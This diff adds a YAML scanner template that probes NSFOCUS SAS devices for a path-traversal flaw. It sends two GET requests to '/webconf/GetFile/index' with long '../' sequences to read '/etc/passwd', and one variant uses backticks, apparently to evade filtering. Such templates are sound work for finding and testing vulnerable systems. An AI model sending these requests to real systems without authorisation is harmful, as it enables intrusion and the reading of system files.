@@ -1,0 +1,14 @@
+name: nsfocus-sas-getfile-readfile
+groups:
+  r1:
+    - method: GET
+      path: "/webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd"
+      expression: |
+        response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r2:
+    - method: GET
+      path: "/webconf/GetFile/index``?``path=../../../../../../../../../../../../../../etc/passwd"
+      expression: |
+        response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+detail:
+  author: 666
